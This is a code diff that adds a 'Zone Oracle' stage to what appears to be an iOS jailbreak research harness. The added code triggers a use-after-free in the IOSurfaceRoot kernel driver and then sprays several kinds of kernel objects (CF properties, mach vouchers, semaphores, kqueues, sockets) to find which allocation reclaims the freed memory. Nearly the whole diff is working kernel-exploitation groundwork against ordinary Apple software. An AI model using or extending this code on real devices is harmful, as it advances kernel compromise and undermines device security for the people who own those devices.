@@ -25,6 +25,8 @@ extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name,
 #include <signal.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <sys/event.h>
+#include <sys/socket.h>
 #import "IOSurfaceResearch.h"
 
 #pragma mark - IOSurface / IOKit symbol types
@@ -41900,6 +41902,408 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
         results[@"verdict"] = verdict;
         log([NSString stringWithFormat:@"JB55: Verdict: %@", verdict]);
         isr_checkpoint(@"JB55-property-crossspray-checkpoint.json", results);
+        done(results);
+    });
+}
+
+#pragma mark - JB56: Zone Oracle
+
+void iosurface_zone_oracle(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"=== Zone Oracle ===");
+        log(@"JB56: === Zone Oracle — Kernel Operation Detector ===");
+
+        typedef unsigned int (*ioservicematching_fn)(const char *);
+        typedef unsigned int (*ioservicegetmatching_fn)(unsigned int, unsigned int);
+        typedef int (*ioserviceopen_fn)(unsigned int, unsigned int, uint32_t, unsigned int *);
+        typedef int (*ioserviceclose_fn)(unsigned int);
+        typedef void (*ioobjectrelease_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int (*ioconnectsetcfprops_fn)(unsigned int, void *);
+        typedef kern_return_t (*host_create_voucher_fn)(host_t, mach_voucher_attr_raw_recipe_array_t, mach_msg_type_number_t, mach_port_t *);
+
+        ioservicematching_fn sym_match = (ioservicematching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        ioservicegetmatching_fn sym_getMatch = (ioservicegetmatching_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        ioserviceopen_fn sym_open = (ioserviceopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        ioserviceclose_fn sym_close = (ioserviceclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        ioobjectrelease_fn sym_release = (ioobjectrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        ioconnectsetcfprops_fn sym_setprops = (ioconnectsetcfprops_fn)dlsym(RTLD_DEFAULT, "IOConnectSetCFProperties");
+        host_create_voucher_fn sym_voucher = (host_create_voucher_fn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
+
+        if (!sym_match || !sym_getMatch || !sym_open || !sym_close || !sym_release || !sym_call || !sym_async) {
+            results[@"verdict"] = @"NO_SYMBOLS";
+            log(@"JB56: Failed to resolve symbols");
+            done(results);
+            return;
+        }
+
+        unsigned int svc = sym_getMatch(0, sym_match("IOSurfaceRoot"));
+        if (!svc) {
+            results[@"verdict"] = @"NO_SERVICE";
+            log(@"JB56: IOSurfaceRoot not found");
+            done(results);
+            return;
+        }
+
+        unsigned int conn = 0;
+        int kr = sym_open(svc, mach_task_self(), 0, &conn);
+        sym_release(svc);
+        if (kr != 0 || !conn) {
+            results[@"verdict"] = @"OPEN_FAIL";
+            log([NSString stringWithFormat:@"JB56: IOServiceOpen failed: 0x%x", kr]);
+            done(results);
+            return;
+        }
+
+        unsigned int wp = 0;
+        {
+            mach_port_t p = MACH_PORT_NULL;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
+            wp = (unsigned int)p;
+        }
+        uint64_t ref = 0x1122334455667788ULL;
+        uint64_t regIn[3] = {1, 2, 3};
+
+        // ---- T1: Baseline UAF confirm ----
+        log(@"JB56: T1 — Baseline UAF confirm");
+        int t1_hits = 0;
+        @try {
+            for (int trial = 0; trial < 3 && !isr_stopped(); trial++) {
+                int r1 = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                int r2 = sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                int r3 = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                log([NSString stringWithFormat:@"JB56: T1 trial=%d reg=0x%x dereg=0x%x dup=0x%x",
+                     trial, (unsigned)r1, (unsigned)r2, (unsigned)r3]);
+
+                if (r1 == 0 && r2 == 0 && r3 != (int)0xC9) {
+                    t1_hits++;
+                }
+            }
+        } @catch (NSException *ex) {
+            log([NSString stringWithFormat:@"JB56: T1 exception: %@", ex.reason]);
+        }
+        results[@"t1_hits"] = @(t1_hits);
+        log([NSString stringWithFormat:@"JB56: T1 hits=%d/3", t1_hits]);
+
+        if (t1_hits == 0 && !isr_stopped()) {
+            log(@"JB56: T1 oracle not working, skipping remaining stages");
+            results[@"verdict"] = @"NO_ORACLE";
+            sym_close(conn);
+            jb41_dropPort(wp);
+            done(results);
+            return;
+        }
+
+        // ---- T2: IOConnectSetCFProperties ----
+        int t2_reclaimed = 0;
+        if (!isr_stopped()) {
+            log(@"JB56: T2 — IOConnectSetCFProperties spray");
+            @try {
+                for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
+                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    if (sym_setprops) {
+                        for (int i = 0; i < 64; i++) {
+                            NSDictionary *small = @{@"a": @(i)};
+                            sym_setprops(conn, (__bridge void *)small);
+                        }
+                    }
+
+                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    log([NSString stringWithFormat:@"JB56: T2 trial=%d dup=0x%x", trial, (unsigned)dup]);
+                    if (dup == 0) {
+                        t2_reclaimed++;
+                    }
+                }
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB56: T2 exception: %@", ex.reason]);
+            }
+        }
+        results[@"t2_reclaimed"] = @(t2_reclaimed);
+        log([NSString stringWithFormat:@"JB56: T2 cfprops reclaimed=%d/5", t2_reclaimed]);
+
+        // ---- T3: mach_voucher_create ----
+        int t3_reclaimed = 0;
+        if (!isr_stopped()) {
+            log(@"JB56: T3 — mach_voucher_create spray");
+            @try {
+                for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
+                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    unsigned int vouchers[64];
+                    int vcount = 0;
+                    if (sym_voucher) {
+                        for (int i = 0; i < 64; i++) {
+                            struct {
+                                uint32_t key;
+                                uint32_t command;
+                                uint32_t previous_voucher;
+                                uint32_t content_size;
+                            } recipe;
+                            memset(&recipe, 0, sizeof(recipe));
+                            recipe.key = 7;
+                            recipe.command = 1;
+                            recipe.content_size = 0;
+                            mach_port_t vp = MACH_PORT_NULL;
+                            kern_return_t vkr = sym_voucher(
+                                mach_host_self(),
+                                (mach_voucher_attr_raw_recipe_array_t)&recipe,
+                                sizeof(recipe),
+                                &vp
+                            );
+                            if (vkr == 0 && vp != MACH_PORT_NULL) {
+                                vouchers[vcount++] = (unsigned int)vp;
+                            }
+                        }
+                    }
+
+                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    for (int i = 0; i < vcount; i++) {
+                        mach_port_deallocate(mach_task_self(), (mach_port_t)vouchers[i]);
+                    }
+
+                    log([NSString stringWithFormat:@"JB56: T3 trial=%d vouchers=%d dup=0x%x",
+                         trial, vcount, (unsigned)dup]);
+                    if (dup == 0) {
+                        t3_reclaimed++;
+                    }
+                }
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB56: T3 exception: %@", ex.reason]);
+            }
+        }
+        results[@"t3_reclaimed"] = @(t3_reclaimed);
+        log([NSString stringWithFormat:@"JB56: T3 voucher reclaimed=%d/5", t3_reclaimed]);
+
+        // ---- T4: semaphore_create ----
+        int t4_reclaimed = 0;
+        if (!isr_stopped()) {
+            log(@"JB56: T4 — semaphore_create spray");
+            @try {
+                for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
+                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    unsigned int sems[64];
+                    int scount = 0;
+                    for (int i = 0; i < 64; i++) {
+                        semaphore_t sp = 0;
+                        kern_return_t skr = semaphore_create(mach_task_self(), &sp, 0, 0);
+                        if (skr == 0 && sp != 0) {
+                            sems[scount++] = (unsigned int)sp;
+                        }
+                    }
+
+                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    for (int i = 0; i < scount; i++) {
+                        semaphore_destroy(mach_task_self(), (semaphore_t)sems[i]);
+                    }
+
+                    log([NSString stringWithFormat:@"JB56: T4 trial=%d sems=%d dup=0x%x",
+                         trial, scount, (unsigned)dup]);
+                    if (dup == 0) {
+                        t4_reclaimed++;
+                    }
+                }
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB56: T4 exception: %@", ex.reason]);
+            }
+        }
+        results[@"t4_reclaimed"] = @(t4_reclaimed);
+        log([NSString stringWithFormat:@"JB56: T4 semaphore reclaimed=%d/5", t4_reclaimed]);
+
+        // ---- T5: kqueue+kevent ----
+        int t5_reclaimed = 0;
+        if (!isr_stopped()) {
+            log(@"JB56: T5 — kqueue+kevent spray");
+            @try {
+                for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
+                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    int kqfds[32];
+                    int kqcount = 0;
+                    for (int i = 0; i < 32; i++) {
+                        int kqfd = kqueue();
+                        if (kqfd >= 0) {
+                            kqfds[kqcount++] = kqfd;
+                            struct kevent kev;
+                            EV_SET(&kev, (uintptr_t)(i + 1), EVFILT_TIMER, EV_ADD | EV_ONESHOT, NOTE_SECONDS, 3600, NULL);
+                            kevent(kqfd, &kev, 1, NULL, 0, NULL);
+                        }
+                    }
+
+                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    for (int i = 0; i < kqcount; i++) {
+                        close(kqfds[i]);
+                    }
+
+                    log([NSString stringWithFormat:@"JB56: T5 trial=%d kqs=%d dup=0x%x",
+                         trial, kqcount, (unsigned)dup]);
+                    if (dup == 0) {
+                        t5_reclaimed++;
+                    }
+                }
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB56: T5 exception: %@", ex.reason]);
+            }
+        }
+        results[@"t5_reclaimed"] = @(t5_reclaimed);
+        log([NSString stringWithFormat:@"JB56: T5 kevent reclaimed=%d/5", t5_reclaimed]);
+
+        // ---- T6: socket+setsockopt ----
+        int t6_reclaimed = 0;
+        if (!isr_stopped()) {
+            log(@"JB56: T6 — socket+setsockopt spray");
+            @try {
+                for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
+                    sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    int sockfds[32];
+                    int sockcount = 0;
+                    for (int i = 0; i < 32; i++) {
+                        int sfd = socket(AF_INET, SOCK_STREAM, 0);
+                        if (sfd >= 0) {
+                            sockfds[sockcount++] = sfd;
+                            int val = 1;
+                            setsockopt(sfd, SOL_SOCKET, SO_KEEPALIVE, &val, sizeof(val));
+                            setsockopt(sfd, SOL_SOCKET, SO_NOSIGPIPE, &val, sizeof(val));
+                        }
+                    }
+
+                    int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    for (int i = 0; i < sockcount; i++) {
+                        close(sockfds[i]);
+                    }
+
+                    log([NSString stringWithFormat:@"JB56: T6 trial=%d socks=%d dup=0x%x",
+                         trial, sockcount, (unsigned)dup]);
+                    if (dup == 0) {
+                        t6_reclaimed++;
+                    }
+                }
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB56: T6 exception: %@", ex.reason]);
+            }
+        }
+        results[@"t6_reclaimed"] = @(t6_reclaimed);
+        log([NSString stringWithFormat:@"JB56: T6 socket reclaimed=%d/5", t6_reclaimed]);
+
+        // ---- T7: Same-type reclaim (different regId) ----
+        int t7_reclaimed = 0;
+        if (!isr_stopped()) {
+            log(@"JB56: T7 — Same-type reclaim (different regId on same conn)");
+            @try {
+                for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
+                    uint64_t regA[3] = {1, 2, 3};
+                    sym_async(conn, 17, wp, &ref, 1, regA, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regA, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    uint64_t regB[3] = {4, 5, 6};
+                    int r_b = sym_async(conn, 17, wp, &ref, 1, regB, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    int dup = sym_async(conn, 17, wp, &ref, 1, regA, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    sym_call(conn, 18, regA, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                    sym_call(conn, 18, regB, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                    log([NSString stringWithFormat:@"JB56: T7 trial=%d regB=0x%x dupA=0x%x",
+                         trial, (unsigned)r_b, (unsigned)dup]);
+                    if (dup == 0) {
+                        t7_reclaimed++;
+                    }
+                }
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB56: T7 exception: %@", ex.reason]);
+            }
+        }
+        results[@"t7_reclaimed"] = @(t7_reclaimed);
+        log([NSString stringWithFormat:@"JB56: T7 same-type reclaimed=%d/5", t7_reclaimed]);
+
+        // ---- T8: Cross-connection same-type ----
+        int t8_reclaimed = 0;
+        if (!isr_stopped()) {
+            log(@"JB56: T8 — Cross-connection same-type reclaim");
+            @try {
+                unsigned int svc2 = sym_getMatch(0, sym_match("IOSurfaceRoot"));
+                unsigned int conn2 = 0;
+                int okr2 = 0;
+                if (svc2) {
+                    okr2 = sym_open(svc2, mach_task_self(), 0, &conn2);
+                    sym_release(svc2);
+                }
+
+                if (okr2 == 0 && conn2 != 0) {
+                    for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
+                        sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                        sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                        int r2 = sym_async(conn2, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                        int dup = sym_async(conn, 17, wp, &ref, 1, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                        sym_call(conn, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+                        sym_call(conn2, 18, regIn, 3, NULL, 0, NULL, NULL, NULL, NULL);
+
+                        log([NSString stringWithFormat:@"JB56: T8 trial=%d regConn2=0x%x dupConn1=0x%x",
+                             trial, (unsigned)r2, (unsigned)dup]);
+                        if (dup == 0) {
+                            t8_reclaimed++;
+                        }
+                    }
+                    sym_close(conn2);
+                } else {
+                    log([NSString stringWithFormat:@"JB56: T8 conn2 open failed: 0x%x", okr2]);
+                }
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB56: T8 exception: %@", ex.reason]);
+            }
+        }
+        results[@"t8_reclaimed"] = @(t8_reclaimed);
+        log([NSString stringWithFormat:@"JB56: T8 cross-conn reclaimed=%d/5", t8_reclaimed]);
+
+        sym_close(conn);
+        jb41_dropPort(wp);
+
+        NSString *verdict = @"NO_HIT";
+        if (t2_reclaimed > 0) {
+            verdict = @"CFPROPS_ZONE_MATCH";
+        } else if (t3_reclaimed > 0) {
+            verdict = @"VOUCHER_ZONE_MATCH";
+        } else if (t4_reclaimed > 0) {
+            verdict = @"SEMAPHORE_ZONE_MATCH";
+        } else if (t5_reclaimed > 0) {
+            verdict = @"KEVENT_ZONE_MATCH";
+        } else if (t6_reclaimed > 0) {
+            verdict = @"SOCKET_ZONE_MATCH";
+        } else if (t7_reclaimed > 0) {
+            verdict = @"SAME_TYPE_RECLAIM";
+        } else if (t8_reclaimed > 0) {
+            verdict = @"CROSS_CONN_RECLAIM";
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB56: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB56-zone-oracle-checkpoint.json", results);
         done(results);
     });
 }
